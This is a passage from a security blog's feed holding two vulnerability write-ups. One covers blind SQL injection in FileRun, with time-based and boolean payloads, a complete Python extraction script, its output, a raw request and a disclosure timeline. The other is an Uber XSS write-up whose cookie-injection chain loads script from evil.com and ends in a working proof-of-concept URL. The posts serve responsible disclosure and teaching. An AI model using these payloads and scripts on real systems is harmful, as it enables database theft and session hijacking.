&lt;p&gt;I notice that the search parameter might be vulnerable to SQL Injection,I injected a single quote after the value (example:aaaa’),examined the server response error:&lt;/p&gt;

&lt;p&gt;然后构造了基于sleep函数延时的payload:&lt;/p&gt;

&lt;p&gt;Use MySQL’s delay function sleep () to testing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/11/30/5c01504c70061.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'xor(sleep(5))or'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;结果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/11/30/5c015098123ba.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后使用Blind SQL注入技术来获取select user()数据验证脚本如下：&lt;/p&gt;

&lt;p&gt;Here I create a simple script to extract current select user()query result using Boolean-based technique.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#__author__ = 'scanf'&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;httplib&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#add cookies&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/x-www-form-urlencoded'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;s&quot;&gt;'User-Agent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Googlebot/2.1 (+http://www.googlebot.com/bot.html)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;s&quot;&gt;'Cookie'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__cfduid=d7455062d8788785c8b64d8dfef5a7f041513411013; language=chinese; FileRunSID=e578cd49697ef564ed0979bde9d67dcf'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;c&quot;&gt;#'Cookie' : 'input you cookie',&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payloads&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.*'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s] Start to retrive MySQL User:'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payloads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;aaaa'xor(if(ascii(mid(user()from(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)for(1)))=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s,1,0))or'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'''limit=50&amp;amp;search='''&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;#url = http://target.com/?module=users&amp;amp;section=cpanel&amp;amp;page=list&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httplib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'target.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'POST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/?module=users&amp;amp;section=cpanel&amp;amp;page=list'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;start_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;html_doc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getresponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html_doc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'uid'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[in progress]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[Done] MySQL user is &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[20:39:20] Start to retrive MySQL User:
. . . . . . 
[in progress] f . . . . . . . . . 
[in progress] fi . . . . . . . . . . . . 
[in progress] fil . . . . . 
[in progress] file . . . . . . . . . . . . . . . . . . 
[in progress] filer . . . . . . . . . . . . . . . . . . . . . 
[in progress] fileru . . . . . . . . . . . . . . 
[in progress] filerun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
[in progress] filerun@ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
[in progress] filerun@1 . . .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;sql2&quot;&gt;SQL2&lt;/h3&gt;

&lt;p&gt;控制面板——&amp;gt;元数据——&amp;gt;快速搜索,输入字符串后将发起一个POST请求:&lt;/p&gt;

&lt;p&gt;control panel——&amp;gt;Metadata——&amp;gt;search Same as SQL1,will generate a POST request to the server:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?module=metadata&amp;amp;section=cpanel&amp;amp;page=list_filetypes HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://target.com/?module=cpanel&amp;amp;_popup_id=popups_1
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 36
Cookie: __cfduid=df5ddd49a2303cb2e13b6aa8ece2af7b11513411363; FileRunSID=fa163cd088b68ae20c689826e3a70479; language=chinese
Connection: close

limit=50&amp;amp;search=aaa'xor(sleep(2))or'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后超时后响应:&lt;/p&gt;

&lt;p&gt;sleep() function is executed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/11/30/5c0150d5f182e.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2017.12.18 发现漏洞并联系官方 Discover the vulnerability and contact the official&lt;/li&gt;
  &lt;li&gt;2017.12.22 等待官方处理 Waiting for official processing&lt;/li&gt;
  &lt;li&gt;2018.2.13 官方修复2.13并致谢并允许公开 Officially fixed 2.13 and thanks and open for publication&lt;/li&gt;
  &lt;li&gt;2018.3.6 请求cve漏洞编号 Request cve&lt;/li&gt;
  &lt;li&gt;2018.3.7 获得CVE-2018-7734 CVE-2018-7735&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;cve information：&lt;/p&gt;

&lt;p&gt;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7734
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735&lt;/p&gt;</content><author><name></name></author><summary type="html">FileRun &amp;lt;= 2017.09.25 Blind SQLi 18 Dec 2017 - scanf</summary></entry><entry><title type="html">Uber XSS via Cookie</title><link href="http://localhost:4000/articles/2017/08/30/uber-cookie-xss.html" rel="alternate" type="text/html" title="Uber XSS via Cookie" /><published>2017-08-30T00:00:00+08:00</published><updated>2017-08-30T00:00:00+08:00</updated><id>http://localhost:4000/articles/2017/08/30/uber-cookie-xss</id><content type="html" xml:base="http://localhost:4000/articles/2017/08/30/uber-cookie-xss.html">&lt;h1 align=&quot;center&quot;&gt;Uber XSS via Cookie&lt;/h1&gt;
&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;30 Aug 2017 - zhchbin&lt;/p&gt;

&lt;p&gt;   This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.&lt;/p&gt;

&lt;h2 id=&quot;jsonp-request&quot;&gt;JSONP Request&lt;/h2&gt;

&lt;p&gt;   Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was jsonp, and my target domain was &lt;code class=&quot;highlighter-rouge&quot;&gt;https://get.uber.com&lt;/code&gt;. Let’s look at what I had found at that time.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;idrCall: function() {
    var a, b;
    return this.idrCallPending ? void 0 : (this.log(&quot;making idr call&quot;),
    a = this.rfiServer ? this.rfiServer : &quot;a.rfihub.com&quot;,
    b = this.getProtocol() + &quot;//&quot; + a + &quot;/idr.js&quot;,
    this.jsonpGet(b, {}, this.idrCallback, &quot;cmZpSWRJbkNhY2hl&quot;),
    this.idrCallPending = !0)
},
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;   Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;this.rfiServer&lt;/code&gt; could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know the essence of JSONP. The next step was searching everything about &lt;code class=&quot;highlighter-rouge&quot;&gt;rfiServer&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After reading through these lines of code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a = this.readCookie(&quot;_rfiServer&quot;),
null != a &amp;amp;&amp;amp; this.setRfiServer(a),
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;   We could get the information that the initial value of &lt;code class=&quot;highlighter-rouge&quot;&gt;this.rfiServer&lt;/code&gt; was set by using value of cookie &lt;code class=&quot;highlighter-rouge&quot;&gt;_rfiServer&lt;/code&gt; if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HTTP Header CRLF Injection at any subdomain of uber.com&lt;/li&gt;
  &lt;li&gt;XSS at any subdomain of uber.com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?&lt;/p&gt;

&lt;h2 id=&quot;the-feature-of-cookie&quot;&gt;The Feature of Cookie&lt;/h2&gt;

&lt;p&gt;   Any subdomain of uber.com can set cookie with domain &lt;code class=&quot;highlighter-rouge&quot;&gt;.uber.com&lt;/code&gt; to be used across subdomains. For instance, we can set cookie in &lt;code class=&quot;highlighter-rouge&quot;&gt;xxx.uber.com&lt;/code&gt; using following code, then &lt;code class=&quot;highlighter-rouge&quot;&gt;get.uber.com&lt;/code&gt; will use the cookie value.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;xss-of-ubercom-which-is-out-of-scope&quot;&gt;XSS of .uber.com which is Out of Scope&lt;/h2&gt;

&lt;p&gt;I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;redacted&amp;gt;.uber.com&lt;/code&gt; for demo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; is reflected and not encoded. We can inject any attribution into &lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; tag.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;type=&quot;text&quot;&lt;/code&gt; is after the injection point. So we can inject &lt;code class=&quot;highlighter-rouge&quot;&gt;type=&quot;image&quot; src=&quot;1&quot; onerror=&quot;alert(1)&quot;&lt;/code&gt;. Note that when there is two types, the second one will be ignored.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; is removed!!! This can be used to bypass Chrome XSS Auditor. How? &lt;code class=&quot;highlighter-rouge&quot;&gt;o&amp;gt;nerror.&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Use reflected XSS of &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;redacted&amp;gt;.uber.com&lt;/code&gt; to set the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;_rfiServer &lt;/code&gt;cookie to &lt;code class=&quot;highlighter-rouge&quot;&gt;evil.com&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Visit &lt;code class=&quot;highlighter-rouge&quot;&gt;get.uber.com&lt;/code&gt;, JSONP request to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://evil.com/idr.js&lt;/code&gt;, XSS of &lt;code class=&quot;highlighter-rouge&quot;&gt;get.uber.com&lt;/code&gt; is done.&lt;/li&gt;
  &lt;li&gt;The final PoC&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://&amp;lt;redacted&amp;gt;.uber.com/&amp;lt;redacted&amp;gt;?
email=aaa&quot;%20type%3d&quot;image&quot;%20src%3d1%20o&amp;gt;nerror%3d&quot;eval(decodeURIComponent(location.hash.substr(1)))
#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href=&quot;https://get.uber.com&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thanks for Uber. Reward: 5k&lt;/p&gt;</content><author><name></name></author><summary type="html">Uber XSS via Cookie 30 Aug 2017 - zhchbin</summary></entry></feed>